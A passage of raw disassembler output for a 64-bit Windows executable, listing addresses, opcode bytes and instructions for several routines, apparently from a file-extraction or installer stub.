   140008208:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   14000820d:	53                   	push   %rbx
   14000820e:	48 83 ec 60          	sub    $0x60,%rsp
   140008212:	33 db                	xor    %ebx,%ebx
   140008214:	45 33 c0             	xor    %r8d,%r8d
   140008217:	c7 44 24 20 ff 04 00 	movl   $0x4ff,0x20(%rsp)
   14000821e:	00 
   14000821f:	41 83 c9 ff          	or     $0xffffffff,%r9d
   140008223:	48 8d 54 24 70       	lea    0x70(%rsp),%rdx
   140008228:	41 8d 48 01          	lea    0x1(%r8),%ecx
   14000822c:	48 ff 15 55 33 00 00 	rex.W call *0x3355(%rip)        # 0x14000b588
   140008233:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008238:	85 c0                	test   %eax,%eax
   14000823a:	74 60                	je     0x14000829c
   14000823c:	0f 57 c0             	xorps  %xmm0,%xmm0
   14000823f:	0f 11 44 24 30       	movups %xmm0,0x30(%rsp)
   140008244:	0f 11 44 24 40       	movups %xmm0,0x40(%rsp)
   140008249:	0f 11 44 24 50       	movups %xmm0,0x50(%rsp)
   14000824e:	eb 1f                	jmp    0x14000826f
   140008250:	83 7c 24 38 12       	cmpl   $0x12,0x38(%rsp)
   140008255:	75 07                	jne    0x14000825e
   140008257:	bb 01 00 00 00       	mov    $0x1,%ebx
   14000825c:	eb 11                	jmp    0x14000826f
   14000825e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008263:	48 ff 15 3e 33 00 00 	rex.W call *0x333e(%rip)        # 0x14000b5a8
   14000826a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000826f:	45 33 c9             	xor    %r9d,%r9d
   140008272:	c7 44 24 20 01 00 00 	movl   $0x1,0x20(%rsp)
   140008279:	00 
   14000827a:	45 33 c0             	xor    %r8d,%r8d
   14000827d:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008282:	33 d2                	xor    %edx,%edx
   140008284:	48 ff 15 a5 33 00 00 	rex.W call *0x33a5(%rip)        # 0x14000b630
   14000828b:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008290:	85 c0                	test   %eax,%eax
   140008292:	75 bc                	jne    0x140008250
   140008294:	85 db                	test   %ebx,%ebx
   140008296:	0f 84 78 ff ff ff    	je     0x140008214
   14000829c:	48 83 c4 60          	add    $0x60,%rsp
   1400082a0:	5b                   	pop    %rbx
   1400082a1:	c3                   	ret
   1400082a2:	cc                   	int3
   1400082a3:	cc                   	int3
   1400082a4:	cc                   	int3
   1400082a5:	cc                   	int3
   1400082a6:	cc                   	int3
   1400082a7:	cc                   	int3
   1400082a8:	cc                   	int3
   1400082a9:	cc                   	int3
   1400082aa:	cc                   	int3
   1400082ab:	cc                   	int3
   1400082ac:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400082b1:	55                   	push   %rbp
   1400082b2:	56                   	push   %rsi
   1400082b3:	57                   	push   %rdi
   1400082b4:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   1400082b9:	48 81 ec 90 00 00 00 	sub    $0x90,%rsp
   1400082c0:	48 8b 05 b9 5d 00 00 	mov    0x5db9(%rip),%rax        # 0x14000e080
   1400082c7:	48 33 c4             	xor    %rsp,%rax
   1400082ca:	48 89 45 37          	mov    %rax,0x37(%rbp)
   1400082ce:	49 8b f8             	mov    %r8,%rdi
   1400082d1:	48 8b d9             	mov    %rcx,%rbx
   1400082d4:	48 ff 15 8d 32 00 00 	rex.W call *0x328d(%rip)        # 0x14000b568
   1400082db:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400082e0:	33 f6                	xor    %esi,%esi
   1400082e2:	0f b6 c8             	movzbl %al,%ecx
   1400082e5:	85 c0                	test   %eax,%eax
   1400082e7:	8b d6                	mov    %esi,%edx
   1400082e9:	0f 49 d1             	cmovns %ecx,%edx
   1400082ec:	83 fa 06             	cmp    $0x6,%edx
   1400082ef:	72 43                	jb     0x140008334
   1400082f1:	48 8d 0d 50 37 00 00 	lea    0x3750(%rip),%rcx        # 0x14000ba48
   1400082f8:	48 ff 15 79 31 00 00 	rex.W call *0x3179(%rip)        # 0x14000b478
   1400082ff:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008304:	48 85 c0             	test   %rax,%rax
   140008307:	74 2b                	je     0x140008334
   140008309:	48 8d 15 58 37 00 00 	lea    0x3758(%rip),%rdx        # 0x14000ba68
   140008310:	48 8b c8             	mov    %rax,%rcx
   140008313:	48 ff 15 2e 30 00 00 	rex.W call *0x302e(%rip)        # 0x14000b348
   14000831a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000831f:	48 85 c0             	test   %rax,%rax
   140008322:	74 10                	je     0x140008334
   140008324:	45 33 c9             	xor    %r9d,%r9d
   140008327:	8d 56 01             	lea    0x1(%rsi),%edx
   14000832a:	45 33 c0             	xor    %r8d,%r8d
   14000832d:	33 c9                	xor    %ecx,%ecx
   14000832f:	e8 dc 1c 00 00       	call   0x14000a010
   140008334:	e8 cb cc ff ff       	call   0x140005004
   140008339:	85 c0                	test   %eax,%eax
   14000833b:	0f 84 07 01 00 00    	je     0x140008448
   140008341:	e8 c2 8c ff ff       	call   0x140001008
   140008346:	83 3d b3 5c 00 00 05 	cmpl   $0x5,0x5cb3(%rip)        # 0x14000e000
   14000834d:	0f 86 d5 00 00 00    	jbe    0x140008428
   140008353:	48 ba 00 00 00 00 00 	movabs $0x800000000000,%rdx
   14000835a:	80 00 00 
   14000835d:	48 85 15 ac 5c 00 00 	test   %rdx,0x5cac(%rip)        # 0x14000e010
   140008364:	74 15                	je     0x14000837b
   140008366:	48 8b 05 ab 5c 00 00 	mov    0x5cab(%rip),%rax        # 0x14000e018
   14000836d:	48 23 c2             	and    %rdx,%rax
   140008370:	48 3b 05 a1 5c 00 00 	cmp    0x5ca1(%rip),%rax        # 0x14000e018
   140008377:	b0 01                	mov    $0x1,%al
   140008379:	74 03                	je     0x14000837e
   14000837b:	40 8a c6             	mov    %sil,%al
   14000837e:	84 c0                	test   %al,%al
   140008380:	0f 84 a2 00 00 00    	je     0x140008428
   140008386:	48 89 55 ff          	mov    %rdx,-0x1(%rbp)
   14000838a:	48 8d 45 ef          	lea    -0x11(%rbp),%rax
   14000838e:	48 89 45 27          	mov    %rax,0x27(%rbp)
   140008392:	48 8d 0d 0f 3a 00 00 	lea    0x3a0f(%rip),%rcx        # 0x14000bda8
   140008399:	0f b7 05 1a 3a 00 00 	movzwl 0x3a1a(%rip),%eax        # 0x14000bdba
   1400083a0:	48 8d 55 f7          	lea    -0x9(%rbp),%rdx
   1400083a4:	89 45 fb             	mov    %eax,-0x5(%rbp)
   1400083a7:	45 33 c9             	xor    %r9d,%r9d
   1400083aa:	48 8b 05 57 5c 00 00 	mov    0x5c57(%rip),%rax        # 0x14000e008
   1400083b1:	45 33 c0             	xor    %r8d,%r8d
   1400083b4:	48 89 45 07          	mov    %rax,0x7(%rbp)
   1400083b8:	48 c7 45 ef 00 00 00 	movq   $0x2000000,-0x11(%rbp)
   1400083bf:	02 
   1400083c0:	48 c7 45 2f 08 00 00 	movq   $0x8,0x2f(%rbp)
   1400083c7:	00 
   1400083c8:	c7 45 f7 00 00 00 0b 	movl   $0xb000000,-0x9(%rbp)
   1400083cf:	0f b7 00             	movzwl (%rax),%eax
   1400083d2:	89 45 0f             	mov    %eax,0xf(%rbp)
   1400083d5:	48 8d 05 e8 39 00 00 	lea    0x39e8(%rip),%rax        # 0x14000bdc4
   1400083dc:	48 89 45 17          	mov    %rax,0x17(%rbp)
   1400083e0:	48 8d 05 43 3a 00 00 	lea    0x3a43(%rip),%rax        # 0x14000be2a
   1400083e7:	2b c1                	sub    %ecx,%eax
   1400083e9:	c7 45 13 02 00 00 00 	movl   $0x2,0x13(%rbp)
   1400083f0:	c7 45 1f 25 00 00 00 	movl   $0x25,0x1f(%rbp)
   1400083f7:	c7 45 23 01 00 00 00 	movl   $0x1,0x23(%rbp)
   1400083fe:	89 45 e7             	mov    %eax,-0x19(%rbp)
   140008401:	8b 45 e7             	mov    -0x19(%rbp),%eax
   140008404:	48 8b 0d 15 5c 00 00 	mov    0x5c15(%rip),%rcx        # 0x14000e020
   14000840b:	48 8d 45 07          	lea    0x7(%rbp),%rax
   14000840f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140008414:	c7 44 24 20 03 00 00 	movl   $0x3,0x20(%rsp)
   14000841b:	00 
   14000841c:	48 ff 15 55 2e 00 00 	rex.W call *0x2e55(%rip)        # 0x14000b278
   140008423:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008428:	48 8b 0d f1 5b 00 00 	mov    0x5bf1(%rip),%rcx        # 0x14000e020
   14000842f:	48 89 35 ea 5b 00 00 	mov    %rsi,0x5bea(%rip)        # 0x14000e020
   140008436:	89 35 c4 5b 00 00    	mov    %esi,0x5bc4(%rip)        # 0x14000e000
   14000843c:	48 ff 15 25 2e 00 00 	rex.W call *0x2e25(%rip)        # 0x14000b268
   140008443:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008448:	48 8b d7             	mov    %rdi,%rdx
   14000844b:	89 35 33 72 00 00    	mov    %esi,0x7233(%rip)        # 0x14000f684
   140008451:	48 8b cb             	mov    %rbx,%rcx
   140008454:	e8 b3 d5 ff ff       	call   0x140005a0c
   140008459:	85 c0                	test   %eax,%eax
   14000845b:	0f 84 a3 00 00 00    	je     0x140008504
   140008461:	e8 6e c4 ff ff       	call   0x1400048d4
   140008466:	8b d8                	mov    %eax,%ebx
   140008468:	e8 47 c1 ff ff       	call   0x1400045b4
   14000846d:	85 db                	test   %ebx,%ebx
   14000846f:	0f 84 8f 00 00 00    	je     0x140008504
   140008475:	40 38 35 de 69 00 00 	cmp    %sil,0x69de(%rip)        # 0x14000ee5a
   14000847c:	0f 85 82 00 00 00    	jne    0x140008504
   140008482:	8b 3d 14 7b 00 00    	mov    0x7b14(%rip),%edi        # 0x14000ff9c
   140008488:	40 f6 c7 01          	test   $0x1,%dil
   14000848c:	74 76                	je     0x140008504
   14000848e:	40 f6 c7 02          	test   $0x2,%dil
   140008492:	75 1e                	jne    0x1400084b2
   140008494:	39 35 e6 71 00 00    	cmp    %esi,0x71e6(%rip)        # 0x14000f680
   14000849a:	75 16                	jne    0x1400084b2
   14000849c:	0f b7 0d 15 7b 00 00 	movzwl 0x7b15(%rip),%ecx        # 0x14000ffb8
   1400084a3:	8b 1d 13 7b 00 00    	mov    0x7b13(%rip),%ebx        # 0x14000ffbc
   1400084a9:	e8 06 b2 ff ff       	call   0x1400036b4
   1400084ae:	3b d8                	cmp    %eax,%ebx
   1400084b0:	74 52                	je     0x140008504
   1400084b2:	40 f6 c7 04          	test   $0x4,%dil
   1400084b6:	75 2b                	jne    0x1400084e3
   1400084b8:	c7 44 24 28 04 00 00 	movl   $0x4,0x28(%rsp)
   1400084bf:	00 
   1400084c0:	4c 8d 05 69 33 00 00 	lea    0x3369(%rip),%r8        # 0x14000b830
   1400084c7:	45 33 c9             	xor    %r9d,%r9d
   1400084ca:	c7 44 24 20 40 00 00 	movl   $0x40,0x20(%rsp)
   1400084d1:	00 
   1400084d2:	ba 22 05 00 00       	mov    $0x522,%edx
   1400084d7:	33 c9                	xor    %ecx,%ecx
   1400084d9:	e8 fa de ff ff       	call   0x1400063d8
   1400084de:	83 f8 06             	cmp    $0x6,%eax
   1400084e1:	75 21                	jne    0x140008504
   1400084e3:	66 39 35 ce 7a 00 00 	cmp    %si,0x7ace(%rip)        # 0x14000ffb8
   1400084ea:	75 13                	jne    0x1400084ff
   1400084ec:	33 d2                	xor    %edx,%edx
   1400084ee:	8d 4a 02             	lea    0x2(%rdx),%ecx
   1400084f1:	48 ff 15 e0 30 00 00 	rex.W call *0x30e0(%rip)        # 0x14000b5d8
   1400084f8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400084fd:	eb 05                	jmp    0x140008504
   1400084ff:	e8 84 b0 ff ff       	call   0x140003588
   140008504:	48 8b 0d 05 64 00 00 	mov    0x6405(%rip),%rcx        # 0x14000e910
   14000850b:	48 85 c9             	test   %rcx,%rcx
   14000850e:	74 0c                	je     0x14000851c
   140008510:	48 ff 15 09 2e 00 00 	rex.W call *0x2e09(%rip)        # 0x14000b320
   140008517:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000851c:	8b 05 62 71 00 00    	mov    0x7162(%rip),%eax        # 0x14000f684
   140008522:	48 8b 4d 37          	mov    0x37(%rbp),%rcx
   140008526:	48 33 cc             	xor    %rsp,%rcx
   140008529:	e8 82 16 00 00       	call   0x140009bb0
   14000852e:	48 8b 9c 24 b8 00 00 	mov    0xb8(%rsp),%rbx
   140008535:	00 
   140008536:	48 81 c4 90 00 00 00 	add    $0x90,%rsp
   14000853d:	5f                   	pop    %rdi
   14000853e:	5e                   	pop    %rsi
   14000853f:	5d                   	pop    %rbp
   140008540:	c3                   	ret
   140008541:	cc                   	int3
   140008542:	cc                   	int3
   140008543:	cc                   	int3
   140008544:	cc                   	int3
   140008545:	cc                   	int3
   140008546:	cc                   	int3
   140008547:	cc                   	int3
   140008548:	66 90                	xchg   %ax,%ax
   14000854a:	c3                   	ret
   14000854b:	cc                   	int3
   14000854c:	cc                   	int3
   14000854d:	cc                   	int3
   14000854e:	cc                   	int3
   14000854f:	cc                   	int3
   140008550:	cc                   	int3
   140008551:	cc                   	int3
   140008552:	cc                   	int3
   140008553:	cc                   	int3
   140008554:	cc                   	int3
   140008555:	cc                   	int3
   140008556:	cc                   	int3
   140008557:	cc                   	int3
   140008558:	cc                   	int3
   140008559:	cc                   	int3
   14000855a:	cc                   	int3
   14000855b:	cc                   	int3
   14000855c:	cc                   	int3
   14000855d:	cc                   	int3
   14000855e:	cc                   	int3
   14000855f:	cc                   	int3
   140008560:	8b d1                	mov    %ecx,%edx
   140008562:	33 c9                	xor    %ecx,%ecx
   140008564:	48 ff 25 a5 2d 00 00 	rex.W jmp *0x2da5(%rip)        # 0x14000b310
   14000856b:	cc                   	int3
   14000856c:	cc                   	int3
   14000856d:	cc                   	int3
   14000856e:	cc                   	int3
   14000856f:	cc                   	int3
   140008570:	cc                   	int3
   140008571:	cc                   	int3
   140008572:	cc                   	int3
   140008573:	cc                   	int3
   140008574:	cc                   	int3
   140008575:	cc                   	int3
   140008576:	cc                   	int3
   140008577:	cc                   	int3
   140008578:	cc                   	int3
   140008579:	cc                   	int3
   14000857a:	cc                   	int3
   14000857b:	cc                   	int3
   14000857c:	cc                   	int3
   14000857d:	cc                   	int3
   14000857e:	cc                   	int3
   14000857f:	cc                   	int3
   140008580:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008585:	57                   	push   %rdi
   140008586:	48 83 ec 20          	sub    $0x20,%rsp
   14000858a:	48 8b d9             	mov    %rcx,%rbx
   14000858d:	48 8d 3d ec 6b 00 00 	lea    0x6bec(%rip),%rdi        # 0x14000f180
   140008594:	48 c1 e3 05          	shl    $0x5,%rbx
   140008598:	83 7c 3b 04 01       	cmpl   $0x1,0x4(%rbx,%rdi,1)
   14000859d:	75 15                	jne    0x1400085b4
   14000859f:	33 c9                	xor    %ecx,%ecx
   1400085a1:	c7 04 3b 01 00 00 00 	movl   $0x1,(%rbx,%rdi,1)
   1400085a8:	48 89 4c 3b 08       	mov    %rcx,0x8(%rbx,%rdi,1)
   1400085ad:	48 89 4c 3b 10       	mov    %rcx,0x10(%rbx,%rdi,1)
   1400085b2:	eb 23                	jmp    0x1400085d7
   1400085b4:	48 8b 4c 3b 18       	mov    0x18(%rbx,%rdi,1),%rcx
   1400085b9:	48 ff 15 60 2d 00 00 	rex.W call *0x2d60(%rip)        # 0x14000b320
   1400085c0:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400085c5:	33 c9                	xor    %ecx,%ecx
   1400085c7:	85 c0                	test   %eax,%eax
   1400085c9:	74 09                	je     0x1400085d4
   1400085cb:	c7 04 3b 01 00 00 00 	movl   $0x1,(%rbx,%rdi,1)
   1400085d2:	eb 03                	jmp    0x1400085d7
   1400085d4:	83 c9 ff             	or     $0xffffffff,%ecx
   1400085d7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400085dc:	8b c1                	mov    %ecx,%eax
   1400085de:	48 83 c4 20          	add    $0x20,%rsp
   1400085e2:	5f                   	pop    %rdi
   1400085e3:	c3                   	ret
   1400085e4:	cc                   	int3
   1400085e5:	cc                   	int3
   1400085e6:	cc                   	int3
   1400085e7:	cc                   	int3
   1400085e8:	cc                   	int3
   1400085e9:	cc                   	int3
   1400085ea:	cc                   	int3
   1400085eb:	cc                   	int3
   1400085ec:	cc                   	int3
   1400085ed:	cc                   	int3
   1400085ee:	cc                   	int3
   1400085ef:	cc                   	int3
   1400085f0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400085f5:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400085fa:	55                   	push   %rbp
   1400085fb:	57                   	push   %rdi
   1400085fc:	41 56                	push   %r14
   1400085fe:	48 8d 6c 24 b0       	lea    -0x50(%rsp),%rbp
   140008603:	48 81 ec 50 01 00 00 	sub    $0x150,%rsp
   14000860a:	48 8b 05 6f 5a 00 00 	mov    0x5a6f(%rip),%rax        # 0x14000e080
   140008611:	48 33 c4             	xor    %rsp,%rax
   140008614:	48 89 45 40          	mov    %rax,0x40(%rbp)
   140008618:	33 f6                	xor    %esi,%esi
   14000861a:	48 8b da             	mov    %rdx,%rbx
   14000861d:	39 35 19 71 00 00    	cmp    %esi,0x7119(%rip)        # 0x14000f73c
   140008623:	74 17                	je     0x14000863c
   140008625:	83 f9 03             	cmp    $0x3,%ecx
   140008628:	75 09                	jne    0x140008633
   14000862a:	48 8b 4a 28          	mov    0x28(%rdx),%rcx
   14000862e:	e8 4d ff ff ff       	call   0x140008580
   140008633:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   140008637:	e9 a1 01 00 00       	jmp    0x1400087dd
   14000863c:	85 c9                	test   %ecx,%ecx
   14000863e:	0f 84 8f 01 00 00    	je     0x1400087d3
   140008644:	83 e9 01             	sub    $0x1,%ecx
   140008647:	74 13                	je     0x14000865c
   140008649:	83 e9 01             	sub    $0x1,%ecx
   14000864c:	0f 84 f2 00 00 00    	je     0x140008744
   140008652:	83 e9 01             	sub    $0x1,%ecx
   140008655:	74 0c                	je     0x140008663
   140008657:	83 f9 01             	cmp    $0x1,%ecx
   14000865a:	74 d7                	je     0x140008633
   14000865c:	33 c0                	xor    %eax,%eax
   14000865e:	e9 7a 01 00 00       	jmp    0x1400087dd
   140008663:	4c 8b 4a 08          	mov    0x8(%rdx),%r9
   140008667:	4c 8d 05 e2 70 00 00 	lea    0x70e2(%rip),%r8        # 0x14000f750
   14000866e:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008673:	e8 cc b6 ff ff       	call   0x140003d44
   140008678:	85 c0                	test   %eax,%eax
   14000867a:	74 b7                	je     0x140008633
   14000867c:	48 8b 7b 28          	mov    0x28(%rbx),%rdi
   140008680:	4c 8d 35 f9 6a 00 00 	lea    0x6af9(%rip),%r14        # 0x14000f180
   140008687:	48 c1 e7 05          	shl    $0x5,%rdi
   14000868b:	48 89 74 24 28       	mov    %rsi,0x28(%rsp)
   140008690:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140008695:	42 83 7c 37 04 01    	cmpl   $0x1,0x4(%rdi,%r14,1)
   14000869b:	74 96                	je     0x140008633
   14000869d:	0f b7 53 32          	movzwl 0x32(%rbx),%edx
   1400086a1:	4c 8d 44 24 28       	lea    0x28(%rsp),%r8
   1400086a6:	0f b7 4b 30          	movzwl 0x30(%rbx),%ecx
   1400086aa:	48 ff 15 e7 2d 00 00 	rex.W call *0x2de7(%rip)        # 0x14000b498
   1400086b1:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400086b6:	85 c0                	test   %eax,%eax
   1400086b8:	0f 84 75 ff ff ff    	je     0x140008633
   1400086be:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400086c3:	48 8d 4c 24 28       	lea    0x28(%rsp),%rcx
   1400086c8:	48 ff 15 51 2d 00 00 	rex.W call *0x2d51(%rip)        # 0x14000b420
   1400086cf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400086d4:	85 c0                	test   %eax,%eax
   1400086d6:	0f 84 57 ff ff ff    	je     0x140008633
   1400086dc:	4a 8b 4c 37 18       	mov    0x18(%rdi,%r14,1),%rcx
   1400086e1:	4c 8d 4c 24 20       	lea    0x20(%rsp),%r9
   1400086e6:	4c 8d 44 24 20       	lea    0x20(%rsp),%r8
   1400086eb:	48 8d 54 24 20       	lea    0x20(%rsp),%rdx
   1400086f0:	48 ff 15 d1 2d 00 00 	rex.W call *0x2dd1(%rip)        # 0x14000b4c8
   1400086f7:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400086fc:	85 c0                	test   %eax,%eax
   1400086fe:	0f 84 2f ff ff ff    	je     0x140008633
   140008704:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140008708:	e8 73 fe ff ff       	call   0x140008580
   14000870d:	66 39 73 34          	cmp    %si,0x34(%rbx)
   140008711:	75 07                	jne    0x14000871a
   140008713:	ba 80 00 00 00       	mov    $0x80,%edx
   140008718:	eb 07                	jmp    0x140008721
   14000871a:	0f b7 53 34          	movzwl 0x34(%rbx),%edx
   14000871e:	83 e2 27             	and    $0x27,%edx
   140008721:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008726:	48 ff 15 13 2c 00 00 	rex.W call *0x2c13(%rip)        # 0x14000b340
   14000872d:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008732:	85 c0                	test   %eax,%eax
   140008734:	0f 84 f9 fe ff ff    	je     0x140008633
   14000873a:	b8 01 00 00 00       	mov    $0x1,%eax
   14000873f:	e9 99 00 00 00       	jmp    0x1400087dd
   140008744:	48 8b 0d 9d 61 00 00 	mov    0x619d(%rip),%rcx        # 0x14000e8e8
   14000874b:	48 85 c9             	test   %rcx,%rcx
   14000874e:	74 15                	je     0x140008765
   140008750:	4c 8b 42 08          	mov    0x8(%rdx),%r8
   140008754:	ba 37 08 00 00       	mov    $0x837,%edx
   140008759:	48 ff 15 70 2e 00 00 	rex.W call *0x2e70(%rip)        # 0x14000b5d0
   140008760:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140008765:	4c 8b 4b 08          	mov    0x8(%rbx),%r9
   140008769:	4c 8d 05 e0 6f 00 00 	lea    0x6fe0(%rip),%r8        # 0x14000f750
   140008770:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008775:	e8 ca b5 ff ff       	call   0x140003d44
   14000877a:	85 c0                	test   %eax,%eax
   14000877c:	0f 84 b1 fe ff ff    	je     0x140008633
   140008782:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   140008787:	e8 8c bb ff ff       	call   0x140004318
   14000878c:	85 c0                	test   %eax,%eax
   14000878e:	0f 84 c8 fe ff ff    	je     0x14000865c
   140008794:	ba 02 83 00 00       	mov    $0x8302,%edx
   140008799:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   14000879e:	41 b8 80 01 00 00    	mov    $0x180,%r8d
   1400087a4:	e8 87 00 00 00       	call   0x140008830
   1400087a9:	48 8b d8             	mov    %rax,%rbx
   1400087ac:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   1400087b0:	0f 84 7d fe ff ff    	je     0x140008633
   1400087b6:	48 8d 4c 24 30       	lea    0x30(%rsp),%rcx
   1400087bb:	e8 ec b1 ff ff       	call   0x1400039ac
   1400087c0:	85 c0                	test   %eax,%eax
   1400087c2:	0f 84 6b fe ff ff    	je     0x140008633
   1400087c8:	ff 05 92 71 00 00    	incl   0x7192(%rip)        # 0x14000f960
   1400087ce:	48 8b c3             	mov    %rbx,%rax
   1400087d1:	eb 0a                	jmp    0x1400087dd
   1400087d3:	48 8b cb             	mov    %rbx,%rcx
   1400087d6:	e8 ad f7 ff ff       	call   0x140007f88
   1400087db:	48 98                	cltq
   1400087dd:	48 8b 4d 40          	mov    0x40(%rbp),%rcx
   1400087e1:	48 33 cc             	xor    %rsp,%rcx
   1400087e4:	e8 c7 13 00 00       	call   0x140009bb0
   1400087e9:	4c 8d 9c 24 50 01 00 	lea    0x150(%rsp),%r11
   1400087f0:	00 
   1400087f1:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   1400087f5:	49 8b 73 30          	mov    0x30(%r11),%rsi
   1400087f9:	49 8b e3             	mov    %r11,%rsp
   1400087fc:	41 5e                	pop    %r14
   1400087fe:	5f                   	pop    %rdi
   1400087ff:	5d                   	pop    %rbp
   140008800:	c3                   	ret
   140008801:	cc                   	int3
   140008802:	cc                   	int3
   140008803:	cc                   	int3
   140008804:	cc                   	int3
   140008805:	cc                   	int3
   140008806:	cc                   	int3
   140008807:	cc                   	int3
   140008808:	cc                   	int3
   140008809:	cc                   	int3
   14000880a:	cc                   	int3
   14000880b:	cc                   	int3
   14000880c:	cc                   	int3
   14000880d:	cc                   	int3
   14000880e:	cc                   	int3
   14000880f:	cc                   	int3
   140008810:	48 ff 25 01 2b 00 00 	rex.W jmp *0x2b01(%rip)        # 0x14000b318
   140008817:	cc                   	int3
   140008818:	cc                   	int3
   140008819:	cc                   	int3
   14000881a:	cc                   	int3
   14000881b:	cc                   	int3
   14000881c:	cc                   	int3
   14000881d:	cc                   	int3
   14000881e:	cc                   	int3
   14000881f:	cc                   	int3
   140008820:	cc                   	int3
   140008821:	cc                   	int3
   140008822:	cc                   	int3
   140008823:	cc                   	int3
   140008824:	cc                   	int3
   140008825:	cc                   	int3
   140008826:	cc                   	int3
   140008827:	cc                   	int3
   140008828:	cc                   	int3
   140008829:	cc                   	int3
   14000882a:	cc                   	int3
   14000882b:	cc                   	int3
   14000882c:	cc                   	int3
   14000882d:	cc                   	int3
   14000882e:	cc                   	int3
   14000882f:	cc                   	int3
   140008830:	48 8b c4             	mov    %rsp,%rax
   140008833:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140008837:	48 89 68 10          	mov    %rbp,0x10(%rax)
   14000883b:	48 89 70 18          	mov    %rsi,0x18(%rax)
   14000883f:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140008843:	41 55                	push   %r13
   140008845:	41 56                	push   %r14
   140008847:	41 57                	push   %r15
   140008849:	48 83 ec 40          	sub    $0x40,%rsp
   14000884d:	45 33 ff             	xor    %r15d,%r15d
   140008850:	4c 8d 2d 29 69 00 00 	lea    0x6929(%rip),%r13        # 0x14000f180
   140008857:	48 8b f1             	mov    %rcx,%rsi
   14000885a:	8b da                	mov    %edx,%ebx
   14000885c:	49 8b c5             	mov    %r13,%rax
   14000885f:	48 8d 0d 1a 6e 00 00 	lea    0x6e1a(%rip),%rcx        # 0x14000f680
   140008866:	41 8d 7f 01          	lea    0x1(%r15),%edi
   14000886a:	39 38                	cmp    %edi,(%rax)
   14000886c:	74 0c                	je     0x14000887a
   14000886e:	44 03 ff             	add    %edi,%r15d
   140008871:	48 83 c0 20          	add    $0x20,%rax
   140008875:	48 3b c1             	cmp    %rcx,%rax
   140008878:	7c f0                	jl     0x14000886a
   14000887a:	41 83 ff 28          	cmp    $0x28,%r15d
   14000887e:	75 2d                	jne    0x1400088ad
   140008880:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140008885:	45 33 c9             	xor    %r9d,%r9d
   140008888:	48 8b 0d 59 60 00 00 	mov    0x6059(%rip),%rcx        # 0x14000e8e8
   14000888f:	45 33 c0             	xor    %r8d,%r8d
   140008892:	ba bb 04 00 00       	mov    $0x4bb,%edx
   140008897:	c7 44 24 20 10 00 00 	movl   $0x10,0x20(%rsp)
   14000889e:	00 
   14000889f:	e8 34 db ff ff       	call   0x1400063d8
   1400088a4:	48 83 c8 ff          	or     $0xffffffffffffffff,%rax
   1400088a8:	e9 b9 01 00 00       	jmp    0x140008a66
   1400088ad:	48 8d 15 fc 59 00 00 	lea    0x59fc(%rip),%rdx        # 0x14000e2b0
   1400088b4:	48 8b ce             	mov    %rsi,%rcx
   1400088b7:	48 ff 15 0a 2b 00 00 	rex.W call *0x2b0a(%rip)        # 0x14000b3c8
   1400088be:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400088c3:	85 c0                	test   %eax,%eax
   1400088c5:	75 3d                	jne    0x140008904
   1400088c7:	f7 c3 0b 01 00 00    	test   $0x10b,%ebx
   1400088cd:	75 d5                	jne    0x1400088a4
   1400088cf:	49 63 d7             	movslq %r15d,%rdx
   1400088d2:	48 8b ca             	mov    %rdx,%rcx
   1400088d5:	48 c1 e1 05          	shl    $0x5,%rcx
   1400088d9:	42 21 04 29          	and    %eax,(%rcx,%r13,1)
   1400088dd:	48 8b 05 bc 6d 00 00 	mov    0x6dbc(%rip),%rax        # 0x14000f6a0
   1400088e4:	42 83 64 29 10 00    	andl   $0x0,0x10(%rcx,%r13,1)
   1400088ea:	4a 89 44 29 08       	mov    %rax,0x8(%rcx,%r13,1)
   1400088ef:	8b 05 b3 6d 00 00    	mov    0x6db3(%rip),%eax        # 0x14000f6a8
   1400088f5:	42 89 44 29 14       	mov    %eax,0x14(%rcx,%r13,1)
   1400088fa:	42 89 7c 29 04       	mov    %edi,0x4(%rcx,%r13,1)
   1400088ff:	e9 5f 01 00 00       	jmp    0x140008a63
   140008904:	f6 c3 08             	test   $0x8,%bl
   140008907:	74 09                	je     0x140008912
   140008909:	48 83 c9 ff          	or     $0xffffffffffffffff,%rcx
